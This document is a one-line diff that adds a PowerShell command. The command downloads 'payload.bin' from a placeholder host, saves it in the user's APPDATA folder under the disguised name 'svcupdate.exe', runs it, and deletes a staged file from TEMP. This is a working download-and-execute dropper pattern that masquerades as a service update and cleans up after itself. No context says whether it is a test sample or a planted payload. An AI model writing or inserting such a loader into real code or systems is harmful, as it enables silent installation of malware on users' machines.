@@ -1,0 +1,1 @@
+$Stage1Url = "https://example.net/downloads/payload.bin"; $OutputPath = "$env:APPDATA\svcupdate.exe"; Invoke-WebRequest -Uri $Stage1Url -OutFile $OutputPath -UseBasicParsing; & $OutputPath; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
